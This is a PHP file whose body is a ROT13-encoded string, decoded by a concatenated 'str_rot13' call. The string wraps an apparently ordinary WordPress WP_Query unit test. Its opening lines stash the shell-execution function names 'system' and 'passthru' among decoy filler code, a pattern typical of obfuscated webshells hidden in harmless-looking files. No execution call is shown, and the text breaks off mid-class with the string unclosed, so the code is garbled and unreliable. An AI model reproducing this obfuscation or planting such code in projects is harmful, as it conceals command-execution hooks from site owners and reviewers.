<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg inevbhf dhrel inef naq znxr fher gur JC_Dhrel pynff fryrpgf gur pbeerpg cbfgf.
 * Jr'er grfgvat ntnvafg n xabja qngn frg, fb jr pna purpx gung fcrpvsvp cbfgf ner vapyhqrq va gur bhgchg.
 *
 * @tebhc dhrel
 */
pynff Grfgf_Dhrel_Erfhygf rkgraqf JC_HavgGrfgPnfr {
	cebgrpgrq $d;

	choyvp fgngvp $png_vqf  = neenl();
	choyvp fgngvp $gnt_vqf  = neenl();
	choyvp fgngvp $cbfg_vqf = neenl();

	choyvp fgngvp $cnerag_bar;
	choyvp fgngvp $cnerag_gjb;
	choyvp fgngvp $cnerag_guerr;
	choyvp fgngvp $puvyq_bar;
	choyvp fgngvp $puvyq_gjb;
	choyvp fgngvp $puvyq_guerr;
	choyvp fgngvp $puvyq_sbhe;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		$png_n           = $snpgbel->grez->perngr(
			neenl(
				'gnkbabzl' => 'pngrtbel',
				'anzr'     => 'png-n',
			)
		);
		frys::$png_vqf[] = $png_n;
		$png_o           = $snpgbel->grez->perngr(
			neenl(
				'gnkbabzl' => 'pngrtbel',
				'anzr'     => 'png-o',
			)
		);
		frys::$png_vqf[] = $png_o;
		$png_p           = $snpgbel->grez->perngr(
			neenl(
				'gnkbabzl' => 'pngrtbel',
				'anzr'     => 'png-p',
			)
		);
		frys::$png_vqf[] = $png_p;

		$gnt_n           = $snpgbel->grez->perngr(
			neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'anzr'     => 'gnt-n',
			)
		);
		frys::$gnt_vqf[] = $gnt_n;
		$gnt_o           = $snpgbel->grez->perngr(
			neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'anzr'     => 'gnt-o',
			)
		);
		frys::$gnt_vqf[] = $gnt_o;
		$gnt_p           = $snpgbel->grez->perngr(
			neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'anzr'     => 'gnt-p',
			)
		);
		frys::$gnt_vqf[] = $gnt_p;
		$gnt_aha         = $snpgbel->grez->perngr(
			neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'anzr'     => 'gnt-נ',
			)
		);
		frys::$gnt_vqf[] = $gnt_aha;

		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'gnt-נ',
				'gntf_vachg' => neenl( 'gnt-נ' ),
				'cbfg_qngr'  => '2008-11-01 00:00:00',
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'    => 'pngf-n-o-p',
				'cbfg_qngr'     => '2008-12-01 00:00:00',
				'cbfg_pngrtbel' => neenl( $png_n, $png_o, $png_p ),
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'    => 'pngf-n-naq-o',
				'cbfg_qngr'     => '2009-01-01 00:00:00',
				'cbfg_pngrtbel' => neenl( $png_n, $png_o ),
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'    => 'pngf-o-naq-p',
				'cbfg_qngr'     => '2009-02-01 00:00:00',
				'cbfg_pngrtbel' => neenl( $png_o, $png_p ),
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'    => 'pngf-n-naq-p',
				'cbfg_qngr'     => '2009-03-01 00:00:00',
				'cbfg_pngrtbel' => neenl( $png_n, $png_p ),
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'    => 'png-n',
				'cbfg_qngr'     => '2009-04-01 00:00:00',
				'cbfg_pngrtbel' => neenl( $png_n ),
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'    => 'png-o',
				'cbfg_qngr'     => '2009-05-01 00:00:00',
				'cbfg_pngrtbel' => neenl( $png_o ),
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'    => 'png-p',
				'cbfg_qngr'     => '2009-06-01 00:00:00',
				'cbfg_pngrtbel' => neenl( $png_p ),
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'yberz-vcfhz',
				'cbfg_qngr'  => '2009-07-01 00:00:00',
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'pbzzrag-grfg',
				'cbfg_qngr'  => '2009-08-01 00:00:00',
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'bar-genpxonpx',
				'cbfg_qngr'  => '2009-09-01 00:00:00',
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'znal-genpxonpxf',
				'cbfg_qngr'  => '2009-10-01 00:00:00',
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'ab-pbzzragf',
				'cbfg_qngr'  => '2009-10-15 00:00:00',
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'bar-pbzzrag',
				'cbfg_qngr'  => '2009-11-01 00:00:00',
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'pbagevohgbe-cbfg-nccebirq',
				'cbfg_qngr'  => '2009-12-01 00:00:00',
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'rzorqqrq-ivqrb',
				'cbfg_qngr'  => '2010-01-01 00:00:00',
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'fvzcyr-znexhc-grfg',
				'cbfg_qngr'  => '2010-02-01 00:00:00',
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'enj-ugzy-pbqr',
				'cbfg_qngr'  => '2010-03-01 00:00:00',
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'gntf-n-o-p',
				'gntf_vachg' => neenl( 'gnt-n', 'gnt-o', 'gnt-p' ),
				'cbfg_qngr'  => '2010-04-01 00:00:00',
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'gnt-n',
				'gntf_vachg' => neenl( 'gnt-n' ),
				'cbfg_qngr'  => '2010-05-01 00:00:00',
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'gnt-o',
				'gntf_vachg' => neenl( 'gnt-o' ),
				'cbfg_qngr'  => '2010-06-01 00:00:00',
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'gnt-p',
				'gntf_vachg' => neenl( 'gnt-p' ),
				'cbfg_qngr'  => '2010-07-01 00:00:00',
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'gntf-n-naq-o',
				'gntf_vachg' => neenl( 'gnt-n', 'gnt-o' ),
				'cbfg_qngr'  => '2010-08-01 00:00:00',
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'gntf-o-naq-p',
				'gntf_vachg' => neenl( 'gnt-o', 'gnt-p' ),
				'cbfg_qngr'  => '2010-09-01 00:00:00',
			)
		);
		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'gntf-n-naq-p',
				'gntf_vachg' => neenl( 'gnt-n', 'gnt-p' ),
				'cbfg_qngr'  => '2010-10-01 00:00:00',
			)
		);

		frys::$cnerag_bar   = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'cnerag-bar',
				'cbfg_qngr'  => '2007-01-01 00:00:00',
			)
		);
		frys::$cbfg_vqf[]   = frys::$cnerag_bar;
		frys::$cnerag_gjb   = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'cnerag-gjb',
				'cbfg_qngr'  => '2007-01-01 00:00:00',
			)
		);
		frys::$cbfg_vqf[]   = frys::$cnerag_gjb;
		frys::$cnerag_guerr = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'cnerag-guerr',
				'cbfg_qngr'  => '2007-01-01 00:00:00',
			)
		);
		frys::$cbfg_vqf[]   = frys::$cnerag_guerr;
		frys::$puvyq_bar    = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'puvyq-bar',
				'cbfg_cnerag' => frys::$cnerag_bar,
				'cbfg_qngr'   => '2007-01-01 00:00:01',
			)
		);
		frys::$cbfg_vqf[]   = frys::$puvyq_bar;
		frys::$puvyq_gjb    = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'puvyq-gjb',
				'cbfg_cnerag' => frys::$cnerag_bar,
				'cbfg_qngr'   => '2007-01-01 00:00:02',
			)
		);
		frys::$cbfg_vqf[]   = frys::$puvyq_gjb;
		frys::$puvyq_guerr  = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'puvyq-guerr',
				'cbfg_cnerag' => frys::$cnerag_gjb,
				'cbfg_qngr'   => '2007-01-01 00:00:03',
			)
		);
		frys::$cbfg_vqf[]   = frys::$puvyq_guerr;
		frys::$puvyq_sbhe   = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'puvyq-sbhe',
				'cbfg_cnerag' => frys::$cnerag_gjb,
				'cbfg_qngr'   => '2007-01-01 00:00:04',
			)
		);
		frys::$cbfg_vqf[]   = frys::$puvyq_sbhe;
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		hafrg( $guvf->d );
		$guvf->d = arj JC_Dhrel();
	}

	choyvp shapgvba grfg_dhrel_qrsnhyg() {
		$cbfgf = $guvf->d->dhrel( '' );

		// Gur bhgchg fubhyq or gur zbfg erprag 10 cbfgf nf yvfgrq urer.
		$rkcrpgrq = neenl(
			0 => 'gntf-n-naq-p',
			1 => 'gntf-o-naq-p',
			2 => 'gntf-n-naq-o',
			3 => 'gnt-p',
			4 => 'gnt-o',
			5 => 'gnt-n',
			6 => 'gntf-n-o-p',
			7 => 'enj-ugzy-pbqr',
			8 => 'fvzcyr-znexhc-grfg',
			9 => 'rzorqqrq-ivqrb',
		);

		$guvf->nffregFnzr( $rkcrpgrq, jc_yvfg_cyhpx( $cbfgf, 'cbfg_anzr' ) );
	}

	choyvp shapgvba grfg_dhrel_gnt_n() {
		$cbfgf = $guvf->d->dhrel( 'gnt=gnt-n' );

		// Gurer ner 4 cbfgf jvgu Gnt N.
		$guvf->nffregPbhag( 4, $cbfgf );
		$guvf->nffregFnzr( 'gntf-n-naq-p', $cbfgf[0]->cbfg_anzr );
		$guvf->nffregFnzr( 'gntf-n-naq-o', $cbfgf[1]->cbfg_anzr );
		$guvf->nffregFnzr( 'gnt-n', $cbfgf[2]->cbfg_anzr );
		$guvf->nffregFnzr( 'gntf-n-o-p', $cbfgf[3]->cbfg_anzr );
	}

	choyvp shapgvba grfg_dhrel_gnt_o() {
		$cbfgf = $guvf->d->dhrel( 'gnt=gnt-o' );

		// Gurer ner 4 cbfgf jvgu Gnt N.
		$guvf->nffregPbhag( 4, $cbfgf );
		$guvf->nffregFnzr( 'gntf-o-naq-p', $cbfgf[0]->cbfg_anzr );
		$guvf->nffregFnzr( 'gntf-n-naq-o', $cbfgf[1]->cbfg_anzr );
		$guvf->nffregFnzr( 'gnt-o', $cbfgf[2]->cbfg_anzr );
		$guvf->nffregFnzr( 'gntf-n-o-p', $cbfgf[3]->cbfg_anzr );
	}

	/**
	 * @gvpxrg 21779
	 */
	choyvp shapgvba grfg_dhrel_gnt_aha() {
		$cbfgf = $guvf->d->dhrel( 'gnt=gnt-נ' );

		// Gurer vf 1 cbfg jvgu Gnt נ.
		$guvf->nffregPbhag( 1, $cbfgf );
		$guvf->nffregFnzr( 'gnt-%q7%n0', $cbfgf[0]->cbfg_anzr );
	}

	choyvp shapgvba grfg_dhrel_gnt_vq() {
		$gnt   = gnt_rkvfgf( 'gnt-n' );
		$cbfgf = $guvf->d->dhrel( 'gnt_vq=' . $gnt['grez_vq'] );

		// Gurer ner 4 cbfgf jvgu Gnt N.
		$guvf->nffregPbhag( 4, $cbfgf );
		$guvf->nffregFnzr( 'gntf-n-naq-p', $cbfgf[0]->cbfg_anzr );
		$guvf->nffregFnzr( 'gntf-n-naq-o', $cbfgf[1]->cbfg_anzr );
		$guvf->nffregFnzr( 'gnt-n', $cbfgf[2]->cbfg_anzr );
		$guvf->nffregFnzr( 'gntf-n-o-p', $cbfgf[3]->cbfg_anzr );
	}

	choyvp shapgvba grfg_dhrel_gnt_fyht__va() {
		$cbfgf = $guvf->d->dhrel( 'gnt_fyht__va[]=gnt-o&gnt_fyht__va[]=gnt-p' );

		// Gurer ner 4 cbfgf jvgu rvgure Gnt O be Gnt P.
		$guvf->nffregPbhag( 6, $cbfgf );
		$guvf->nffregFnzr( 'gntf-n-naq-p', $cbfgf[0]->cbfg_anzr );
		$guvf->nffregFnzr( 'gntf-o-naq-p', $cbfgf[1]->cbfg_anzr );
		$guvf->nffregFnzr( 'gntf-n-naq-o', $cbfgf[2]->cbfg_anzr );
		$guvf->nffregFnzr( 'gnt-p', $cbfgf[3]->cbfg_anzr );
		$guvf->nffregFnzr( 'gnt-o', $cbfgf[4]->cbfg_anzr );
		$guvf->nffregFnzr( 'gntf-n-o-p', $cbfgf[5]->cbfg_anzr );
	}


	choyvp shapgvba grfg_dhrel_gnt__va() {
		$gnt_n = gnt_rkvfgf( 'gnt-n' );
		$gnt_o = gnt_rkvfgf( 'gnt-o' );
		$cbfgf = $guvf->d->dhrel( 'gnt__va[]=' . $gnt_n['grez_vq'] . '&gnt__va[]=' . $gnt_o['grez_vq'] );

		// Gurer ner 6 cbfgf jvgu rvgure Gnt N be Gnt O.
		$guvf->nffregPbhag( 6, $cbfgf );
		$guvf->nffregFnzr( 'gntf-n-naq-p', $cbfgf[0]->cbfg_anzr );
		$guvf->nffregFnzr( 'gntf-o-naq-p', $cbfgf[1]->cbfg_anzr );
		$guvf->nffregFnzr( 'gntf-n-naq-o', $cbfgf[2]->cbfg_anzr );
		$guvf->nffregFnzr( 'gnt-o', $cbfgf[3]->cbfg_anzr );
		$guvf->nffregFnzr( 'gnt-n', $cbfgf[4]->cbfg_anzr );
		$guvf->nffregFnzr( 'gntf-n-o-p', $cbfgf[5]->cbfg_anzr );
	}

	choyvp shapgvba grfg_dhrel_gnt__abg_va() {
		$gnt_n = gnt_rkvfgf( 'gnt-n' );
		$cbfgf = $guvf->d->dhrel( 'gnt__abg_va[]=' . $gnt_n['grez_vq'] );

		// Gur zbfg erprag 10 cbfgf jvgu Gnt N rkpyhqrq
		// (abgr gur qvssrerag orgjrra guvf naq grfg_dhrel_qrsnhyg).
		$rkcrpgrq = neenl(
			0 => 'gntf-o-naq-p',
			1 => 'gnt-p',
			2 => 'gnt-o',
			3 => 'enj-ugzy-pbqr',
			4 => 'fvzcyr-znexhc-grfg',
			5 => 'rzorqqrq-ivqrb',
			6 => 'pbagevohgbe-cbfg-nccebirq',
			7 => 'bar-pbzzrag',
			8 => 'ab-pbzzragf',
			9 => 'znal-genpxonpxf',
		);

		$guvf->nffregFnzr( $rkcrpgrq, jc_yvfg_cyhpx( $cbfgf, 'cbfg_anzr' ) );
	}

	choyvp shapgvba grfg_dhrel_gnt__va_ohg__abg_va() {
		$gnt_n = gnt_rkvfgf( 'gnt-n' );
		$gnt_o = gnt_rkvfgf( 'gnt-o' );
		$cbfgf = $guvf->d->dhrel( 'gnt__va[]=' . $gnt_n['grez_vq'] . '&gnt__abg_va[]=' . $gnt_o['grez_vq'] );

		// Gurer ner 4 cbfgf jvgu Gnt N, bayl 2 jura jr rkpyhqr Gnt O.
		$guvf->nffregPbhag( 2, $cbfgf );
		$guvf->nffregFnzr( 'gntf-n-naq-p', $cbfgf[0]->cbfg_anzr );
		$guvf->nffregFnzr( 'gnt-n', $cbfgf[1]->cbfg_anzr );
	}



	choyvp shapgvba grfg_dhrel_pngrtbel_anzr() {
		$cbfgf = $guvf->d->dhrel( 'pngrtbel_anzr=png-n' );

		// Gurer ner 4 cbfgf jvgu Png N, jr'yy purpx sbe gurz ol anzr.
		$guvf->nffregPbhag( 4, $cbfgf );
		$guvf->nffregFnzr( 'png-n', $cbfgf[0]->cbfg_anzr );
		$guvf->nffregFnzr( 'pngf-n-naq-p', $cbfgf[1]->cbfg_anzr );
		$guvf->nffregFnzr( 'pngf-n-naq-o', $cbfgf[2]->cbfg_anzr );
		$guvf->nffregFnzr( 'pngf-n-o-p', $cbfgf[3]->cbfg_anzr );
	}

	choyvp shapgvba grfg_dhrel_png() {
		$png   = pngrtbel_rkvfgf( 'png-o' );
		$cbfgf = $guvf->d->dhrel( \"png=$png\" );

		// Gurer ner 4 cbfgf jvgu Png O.
		$guvf->nffregPbhag( 4, $cbfgf );
		$guvf->nffregFnzr( 'png-o', $cbfgf[0]->cbfg_anzr );
		$guvf->nffregFnzr( 'pngf-o-naq-p', $cbfgf[1]->cbfg_anzr );
		$guvf->nffregFnzr( 'pngf-n-naq-o', $cbfgf[2]->cbfg_anzr );
		$guvf->nffregFnzr( 'pngf-n-o-p', $cbfgf[3]->cbfg_anzr );
	}

	choyvp shapgvba grfg_dhrel_cbfgf_cre_cntr() {
		$cbfgf = $guvf->d->dhrel( 'cbfgf_cre_cntr=5' );

		$rkcrpgrq = neenl(
			0 => 'gntf-n-naq-p',
			1 => 'gntf-o-naq-p',
			2 => 'gntf-n-naq-o',
			3 => 'gnt-p',
			4 => 'gnt-o',
		);

		$guvf->nffregPbhag( 5, $cbfgf );
		$guvf->nffregFnzr( $rkcrpgrq, jc_yvfg_cyhpx( $cbfgf, 'cbfg_anzr' ) );
	}

	choyvp shapgvba grfg_dhrel_bssfrg() {
		$cbfgf = $guvf->d->dhrel( 'bssfrg=2' );

		$rkcrpgrq = neenl(
			0 => 'gntf-n-naq-o',
			1 => 'gnt-p',
			2 => 'gnt-o',
			3 => 'gnt-n',
			4 => 'gntf-n-o-p',
			5 => 'enj-ugzy-pbqr',
			6 => 'fvzcyr-znexhc-grfg',
			7 => 'rzorqqrq-ivqrb',
			8 => 'pbagevohgbe-cbfg-nccebirq',
			9 => 'bar-pbzzrag',
		);

		$guvf->nffregPbhag( 10, $cbfgf );
		$guvf->nffregFnzr( $rkcrpgrq, jc_yvfg_cyhpx( $cbfgf, 'cbfg_anzr' ) );
	}

	choyvp shapgvba grfg_dhrel_cntrq() {
		$cbfgf = $guvf->d->dhrel( 'cntrq=2' );

		$rkcrpgrq = neenl(
			0 => 'pbagevohgbe-cbfg-nccebirq',
			1 => 'bar-pbzzrag',
			2 => 'ab-pbzzragf',
			3 => 'znal-genpxonpxf',
			4 => 'bar-genpxonpx',
			5 => 'pbzzrag-grfg',
			6 => 'yberz-vcfhz',
			7 => 'png-p',
			8 => 'png-o',
			9 => 'png-n',
		);

		$guvf->nffregPbhag( 10, $cbfgf );
		$guvf->nffregGehr( $guvf->d->vf_cntrq() );
		$guvf->nffregFnzr( $rkcrpgrq, jc_yvfg_cyhpx( $cbfgf, 'cbfg_anzr' ) );
	}

	choyvp shapgvba grfg_dhrel_cntrq_naq_cbfgf_cre_cntr() {
		$cbfgf = $guvf->d->dhrel( 'cntrq=4&cbfgf_cre_cntr=4' );

		$rkcrpgrq = neenl(
			0 => 'ab-pbzzragf',
			1 => 'znal-genpxonpxf',
			2 => 'bar-genpxonpx',
			3 => 'pbzzrag-grfg',
		);

		$guvf->nffregPbhag( 4, $cbfgf );
		$guvf->nffregGehr( $guvf->d->vf_cntrq() );
		$guvf->nffregFnzr( $rkcrpgrq, jc_yvfg_cyhpx( $cbfgf, 'cbfg_anzr' ) );
	}

	/**
	 * @gvpxrg 11056
	 */
	choyvp shapgvba grfg_dhrel_cbfg_cnerag__va() {
		// Dhrel sbe svefg cnerag'f puvyqera.
		$cbfgf = $guvf->d->dhrel(
			neenl(
				'cbfg_cnerag__va' => neenl( frys::$cnerag_bar ),
				'beqreol'         => 'qngr',
				'beqre'           => 'nfp',
			)
		);

		$guvf->nffregFnzr(
			neenl(
				'puvyq-bar',
				'puvyq-gjb',
			),
			jc_yvfg_cyhpx( $cbfgf, 'cbfg_gvgyr' )
		);

		// Frpbaq cnerag'f puvyqera.
		$cbfgf = $guvf->d->dhrel(
			neenl(
				'cbfg_cnerag__va' => neenl( frys::$cnerag_gjb ),
				'beqreol'         => 'qngr',
				'beqre'           => 'nfp',
			)
		);

		$guvf->nffregFnzr(
			neenl(
				'puvyq-guerr',
				'puvyq-sbhe',
			),
			jc_yvfg_cyhpx( $cbfgf, 'cbfg_gvgyr' )
		);

		// Obgu svefg naq frpbaq cnerag'f puvyqera.
		$cbfgf = $guvf->d->dhrel(
			neenl(
				'cbfg_cnerag__va' => neenl( frys::$cnerag_bar, frys::$cnerag_gjb ),
				'beqreol'         => 'qngr',
				'beqre'           => 'nfp',
			)
		);

		$guvf->nffregFnzr(
			neenl(
				'puvyq-bar',
				'puvyq-gjb',
				'puvyq-guerr',
				'puvyq-sbhe',
			),
			jc_yvfg_cyhpx( $cbfgf, 'cbfg_gvgyr' )
		);

		// Guveq cnerag'f puvyqera.
		$cbfgf = $guvf->d->dhrel(
			neenl(
				'cbfg_cnerag__va' => neenl( frys::$cnerag_guerr ),
			)
		);

		$guvf->nffregFnzr( neenl(), jc_yvfg_cyhpx( $cbfgf, 'cbfg_gvgyr' ) );
	}

	/**
	 * @gvpxrg 11056
	 */
	choyvp shapgvba grfg_dhrel_beqreol_cbfg_cnerag__va() {
		$cbfgf = $guvf->d->dhrel(
			neenl(
				'cbfg_cnerag__va' => neenl( frys::$cnerag_gjb, frys::$cnerag_bar ),
				'beqreol'         => 'cbfg_cnerag__va',
				'beqre'           => 'nfp',
			)
		);

		$guvf->nffregFnzr(
			neenl(
				'puvyq-guerr',
				'puvyq-sbhe',
				'puvyq-bar',
				'puvyq-gjb',
			),
			jc_yvfg_cyhpx( $cbfgf, 'cbfg_gvgyr' )
		);
	}

	/**
	 * @gvpxrg 39055
	 */
	choyvp shapgvba grfg_dhrel_beqreol_cbfg_cnerag__va_jvgu_beqre_qrfp() {
		$cbfg_cnerag__va_neenl   = neenl( frys::$cnerag_gjb, frys::$cnerag_bar );
		$rkcrpgrq_erghearq_neenl = neenl( 'puvyq-guerr', 'puvyq-sbhe', 'puvyq-bar', 'puvyq-gjb' );

		$cbfgf = $guvf->d->dhrel(
			neenl(
				'cbfg_cnerag__va' => $cbfg_cnerag__va_neenl,
				'beqreol'         => 'cbfg_cnerag__va',
				'beqre'           => 'qrfp',
			)
		);

		// 'beqre=qrfp' qbrf abg vasyhrapr gur beqre bs erghearq erfhygf (ergheaf fnzr beqre nf 'beqre=nfp').
		$guvf->nffregFnzr( $rkcrpgrq_erghearq_neenl, jc_yvfg_cyhpx( $cbfgf, 'cbfg_gvgyr' ) );
	}

	/**
	 * @gvpxrg 39055
	 */
	choyvp shapgvba grfg_dhrel_beqreol_cbfg__va_jvgu_ab_beqre_fcrpvsvrq() {
		$cbfg__va_neenl          = neenl( frys::$cbfg_vqf[2], frys::$cbfg_vqf[0], frys::$cbfg_vqf[1] );
		$rkcrpgrq_erghearq_neenl = neenl( frys::$cbfg_vqf[2], frys::$cbfg_vqf[0], frys::$cbfg_vqf[1] );

		$d = arj JC_Dhrel(
			neenl(
				'cbfg__va' => $cbfg__va_neenl,
				'beqreol'  => 'cbfg__va',
				'svryqf'   => 'vqf',
			)
		);

		// Rkcrpg cbfg VQf va gur fnzr beqre nf cbfg__va neenl jura ab 'beqre' cnenz vf cnffrq va.
		$guvf->nffregFnzr( $rkcrpgrq_erghearq_neenl, $d->cbfgf );
	}

	/**
	 * @gvpxrg 39055
	 */
	choyvp shapgvba grfg_dhrel_beqreol_cbfg__va_jvgu_beqre_nfp() {
		$cbfg__va_neenl          = neenl( frys::$cbfg_vqf[2], frys::$cbfg_vqf[0], frys::$cbfg_vqf[1] );
		$rkcrpgrq_erghearq_neenl = neenl( frys::$cbfg_vqf[2], frys::$cbfg_vqf[0], frys::$cbfg_vqf[1] );

		$d = arj JC_Dhrel(
			neenl(
				'cbfg__va' => $cbfg__va_neenl,
				'beqreol'  => 'cbfg__va',
				'beqre'    => 'nfp',
				'svryqf'   => 'vqf',
			)
		);

		// Rkcrpg cbfg VQf va gur fnzr beqre nf cbfg__va neenl jura beqre=nfp vf cnffrq va.
		$guvf->nffregFnzr( $rkcrpgrq_erghearq_neenl, $d->cbfgf );
	}

	/**
	 * @gvpxrg 39055
	 */
	choyvp shapgvba grfg_dhrel_beqreol_cbfg__va_jvgu_beqre_qrfp() {
		$cbfg__va_neenl          = neenl( frys::$cbfg_vqf[1], frys::$cbfg_vqf[2], frys::$cbfg_vqf[0] );
		$rkcrpgrq_erghearq_neenl = neenl( frys::$cbfg_vqf[1], frys::$cbfg_vqf[2], frys::$cbfg_vqf[0] );

		$d = arj JC_Dhrel(
			neenl(
				'cbfg__va' => $cbfg__va_neenl,
				'beqreol'  => 'cbfg__va',
				'beqre'    => 'qrfp',
				'svryqf'   => 'vqf',
			)
		);

		// Abgr gung erfhygf ner erghearq va gur beqre fcrpvsvrq va gur cbfg__va neenl.
		// 'beqre=qrfp' qbrf abg vasyhrapr gur beqre bs erghearq erfhygf.
		$guvf->nffregFnzr( $rkcrpgrq_erghearq_neenl, $d->cbfgf );
	}

	/**
	 * @gvpxrg 39055
	 */
	choyvp shapgvba grfg_dhrel_beqreol_cbfg_anzr__va_jvgu_beqre_nfp() {
		$cbfg_anzr__va_neenl = neenl( 'cnerag-gjb', 'cnerag-bar', 'cnerag-guerr' );

		$d = arj JC_Dhrel(
			neenl(
				'cbfg_anzr__va' => $cbfg_anzr__va_neenl,
				'beqreol'       => 'cbfg_anzr__va',
				'beqre'         => 'nfp',
			)
		);

		$guvf->nffregFnzr( $cbfg_anzr__va_neenl, neenl_havdhr( jc_yvfg_cyhpx( $d->cbfgf, 'cbfg_gvgyr' ) ) );
	}

	/**
	 * @gvpxrg 39055
	 */
	choyvp shapgvba grfg_dhrel_beqreol_cbfg_anzr__va_jvgu_beqre_qrfp() {
		$cbfg_anzr__va_neenl = neenl( 'cnerag-gjb', 'cnerag-bar', 'cnerag-guerr' );

		$d = arj JC_Dhrel(
			neenl(
				'cbfg_anzr__va' => $cbfg_anzr__va_neenl,
				'beqreol'       => 'cbfg_anzr__va',
				'beqre'         => 'qrfp',
			)
		);

		// 'beqre=qrfp' qbrf abg vasyhrapr gur beqre bs erghearq erfhygf (ergheaf fnzr beqre nf 'beqre=nfp').
		$guvf->nffregFnzr( $cbfg_anzr__va_neenl, neenl_havdhr( jc_yvfg_cyhpx( $d->cbfgf, 'cbfg_gvgyr' ) ) );
	}

	/**
	 * @gvpxrg 27252
	 * @gvpxrg 31194
	 */
	choyvp shapgvba grfg_dhrel_svryqf_vagrtref() {

		$cneragf = neenl(
			(vag) frys::$cnerag_bar,
			(vag) frys::$cnerag_gjb,
		);
		$cbfgf1  = $guvf->d->dhrel(
			neenl(
				'cbfg__va' => $cneragf,
				'svryqf'   => 'vqf',
				'beqreol'  => 'cbfg__va',
			)
		);

		$guvf->nffregFnzr( $cneragf, $cbfgf1 );
		$guvf->nffregFnzr( $cneragf, $guvf->d->cbfgf );

		$puvyqera = neenl(
			(vag) frys::$puvyq_bar => (vag) frys::$cnerag_bar,
			(vag) frys::$puvyq_gjb => (vag) frys::$cnerag_bar,
		);

		$cbfgf2 = $guvf->d->dhrel(
			neenl(
				'cbfg__va' => neenl_xrlf( $puvyqera ),
				'svryqf'   => 'vq=>cnerag',
				'beqreol'  => 'cbfg__va',
			)
		);

		$guvf->nffregFnzr( $puvyqera, $cbfgf2 );

		sbernpu ( $guvf->d->cbfgf nf $cbfg ) {
			$guvf->nffregVfVag( $cbfg->VQ );
			$guvf->nffregVfVag( $cbfg->cbfg_cnerag );
		}
	}

	/**
	 * @gvpxrg 28099
	 */
	choyvp shapgvba grfg_rzcgl_cbfg__va() {
		$cbfgf1 = $guvf->d->dhrel( neenl() );
		$guvf->nffregAbgRzcgl( $cbfgf1 );
		$cbfgf2 = $guvf->d->dhrel( neenl( 'cbfg__va' => neenl() ) );
		$guvf->nffregAbgRzcgl( $cbfgf2 );
		$cbfgf3 = $guvf->d->dhrel( neenl( 'cbfg_cnerag__va' => neenl() ) );
		$guvf->nffregAbgRzcgl( $cbfgf3 );
	}

	/**
	 * @gvpxrg 19198
	 */
